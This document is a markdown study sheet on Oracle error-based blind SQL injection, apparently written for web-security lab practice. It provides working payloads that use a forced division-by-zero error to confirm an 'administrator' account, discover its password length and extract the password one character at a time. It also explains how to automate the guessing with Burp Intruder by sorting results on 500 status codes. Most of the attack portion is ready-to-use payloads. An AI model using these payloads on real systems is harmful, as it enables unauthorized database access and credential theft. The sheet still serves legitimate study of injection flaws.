# SQLi: Inferential (Error-based) Blind

**Category:** SQL Injection

**Sub-Category:** Inferential / Blind

**Logic:** Triggering a deliberate server-side runtime error (e.g., Division by Zero) to create a binary signal when content-based Boolean logic is suppressed.

---

## Exploit Logic

> The application returns a generic `500 Internal Server Error` (or a specific error page) only when the injected SQL condition is **True**.

* **The Trigger (Oracle):** `(SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)`
* **The Signal:** * Logic is **True** → DB executes `1/0` → **500 Internal Server Error**
* Logic is **False** → DB executes `NULL` → **200 OK**



## Extraction Methodology

### 1. Verify Injection Point (Concatenation)

On Oracle, use string concatenation to ensure the subquery is executed within the parameter:

```sql
'||(SELECT '' FROM dual)||'

```

### 2. Confirm Table/User Presence

Before brute-forcing, confirm the target exists. If the user doesn't exist, the `CASE` statement is never reached, and no error will trigger:

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
### 3. Password Length Discovery
Use a conditional error to find the exact length of the password:

```sql
'||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```
### 4. Data Exfiltration (Character-by-Character)

Set a "landmine" that only detonates when the character guess is correct:

```sql
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

```

---

## Technical Caveats

* **Runtime vs. Syntax Errors:** A **Syntax Error** (e.g., a missing quote) will always return a 500 error, giving you a "False Positive." A **Runtime Error** only happens when the logic path is actually executed. Always verify with a `1=2` (False) condition to ensure the page returns 200 OK.
* **Empty Result Sets:** If your subquery (e.g., `FROM users WHERE username='nonexistent'`) returns zero rows, the `CASE` statement is never evaluated. A **200 OK** in this case doesn't mean the condition was false; it means the query found nothing to process.

## Operational Insights

* **Type Conversion:** Using `TO_CHAR(1/0)` is often necessary in Oracle to ensure the error-inducing expression matches the data type of the column you are injecting into.
* **Intruder Configuration:** * **Target:** The character inside the `SUBSTR(...)='§a§'`.
* **Grep - Extract:** You aren't looking for text on the page; you are looking for the **HTTP Status Code**. Sort the Intruder results by the "Status" column; the **500s** are your successful hits.



---

## Concept Summary

**"The Landmine"**: You are placing a mathematical trap inside the database. If your guess is correct, the database "steps" on the logic, triggers an error, and the server crashes (500). If you are wrong, the database bypasses the trap safely (200).
